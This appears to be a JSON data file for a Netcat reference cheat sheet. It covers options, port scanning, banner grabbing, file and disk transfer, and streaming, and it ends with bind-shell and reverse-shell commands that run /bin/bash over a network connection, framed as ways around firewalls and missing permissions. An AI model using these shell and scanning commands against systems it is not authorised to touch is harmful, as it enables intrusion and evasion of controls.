{
  "id": "nc",
  "title": "Netcat",
  "intro": "This cheat sheet provides various for using Netcat on both Linux and Unix.",
  "tags": [
    "ncat",
    "nc",
    "utility",
    "network",
    "traffic"
  ],
  "categories": [
    "Linux Command"
  ],
  "background": "bg-blue-600",
  "content": "## Getting Started {.cols-5}\n\n### Usage {.col-span-2}\n\nConnect to a host located anywhere\n\n```shell script\n$ nc [options] [host] [port]\n```\n\nListen for incoming connections\n\n```shell script\n$ nc -lp port [host] [port]\n```\n\n### Option examples {.col-span-3 .row-span-2}\n\n| Option | Description                | Example                                  |\n| ------ | -------------------------- | ---------------------------------------- |\n| `-h`   | nc -h                      | Help                                     |\n| `-z`   | nc -z 192.168.1.9 1-100    | Port scan for a host or IP address       |\n| `-v`   | nc -zv 192.168.1.9 1-100   | Provide verbose output                   |\n| `-n`   | nc -zn 192.168.1.9 1-100   | Fast scan by disabling DNS resolution    |\n| `-l`   | nc -lp 8000                | TCP Listen mode _(for inbound connects)_ |\n| `-w`   | nc -w 180 192.168.1.9 8000 | Define timeout value                     |\n| `-k`   | nc -kl 8000                | Continue listening after disconnection   |\n| `-u`   | nc -u 192.168.1.9 8000     | Use UDP instead of TCP                   |\n| `-q`   | nc -q 1 192.168.1.9 8000   | Client stay up after EOF                 |\n| `-4`   | nc -4 -l 8000              | IPv4 only                                |\n| `-6`   | nc -6 -l 8000              | IPv6 only                                |\n\n### Chat client-server {.col-span-2}\n\nServer (192.168.1.9)\n\n```shell script\n$ nc -lv 8000\n```\n\nClient\n\n```shell script\n$ nc 192.168.1.9 8000\n```\n\n## Netcat Examples\n\n### Banner grabbing\n\n```shell script\n$ nc website.com 80\nGET index.html HTTP/1.1\nHEAD / HTTP/1.1\n```\n\nor\n\n```shell script\necho \"\" | nc -zv -wl 192.168.1.1 801-805\n```\n\n### Port scanning\n\nScan ports between 21 to 25\n\n```shell script\n$ nc -zvn 192.168.1.1 21-25\n```\n\nScan ports 22, 3306 and 8080\n\n```shell script\n$ nc -zvn 192.168.1.1 22 3306 8080\n```\n\n### Proxy and port forwarding\n\n```shell script\n$ nc -lp 8001 -c \"nc 127.0.0.1 8000\"\n```\n\nor\n\n```shell script\n$ nc -l 8001 | nc 127.0.0.1 8000\n```\n\nCreate a tunnel from one local port to another\n\n### Download file\n\nServer (192.168.1.9)\n\n```shell script\n$ nc -lv 8000 < file.txt\n```\n\nClient\n\n```shell script\n$ nc -nv 192.168.1.9 8000 > file.txt\n```\n\nSuppose you want to transfer a file “file.txt” from server A to client B.\n\n### Upload file\n\nServer (192.168.1.9)\n\n```shell script\n$ nc -lv 8000 > file.txt\n```\n\nClient\n\n```shell script\n$ nc 192.168.1.9 8000 < file.txt\n```\n\nSuppose you want to transfer a file “file.txt” from client B to server A:\n\n### Directory transfer\n\nServer (192.168.1.9)\n\n```shell script\n$ tar -cvf – dir_name | nc -l 8000\n```\n\nClient\n\n```shell script\n$ nc -n 192.168.1.9 8000 | tar -xvf -\n```\n\nSuppose you want to transfer a directory over the network from A to B.\n\n### Encrypt transfer {.col-span-2}\n\nServer (192.168.1.9)\n\n```shell script\n$ openssl enc -des3 -in file.txt -pass pass:password | nc -l 8000\n```\n\nClient\n\n```shell script\n$ nc 192.168.1.9 8000 | openssl enc -des3 -d -pass pass:password -out file.txt\n```\n\nEncrypt data before transfering over the network\n\n### Clones\n\nServer (192.168.1.9)\n\n```shell script\n$ dd if=/dev/sda | nc -l 8000\n```\n\nClient\n\n```shell script\n$ nc -n 192.168.1.9 8000 | dd of=/dev/sda\n```\n\nCloning a linux PC is very simple. Suppose your system disk is /dev/sda\n\n### Video streaming\n\nServer (192.168.1.9)\n\n```shell script\n$ cat video.avi | nc -l 8000\n```\n\nClient\n\n```shell script {.wrap}\n$ nc 192.168.1.9 8000 | mplayer -vo x11 -cache 3000 -\n```\n\nStreaming video with netcat\n\n### Remote shell\n\nServer (192.168.1.9)\n\n```shell script\n$ nc -lv 8000 -e /bin/bash\n```\n\nClient\n\n```shell script\n$ nc 192.168.1.9 8000\n```\n\nWe have used remote Shell using the telnet and ssh but what if they are not installed and we do not have the permission\nto install them, then we can create remote shell using netcat also.\n\n### Reverse shell\n\nServer (192.168.1.9)\n\n```shell script\n$ nc -lv 8000\n```\n\nClient\n\n```shell script\n$ nc 192.168.1.9 8000 -v -e /bin/bash\n```\n\nReverse shells are often used to bypass the firewall restrictions like blocked inbound connections\n"
}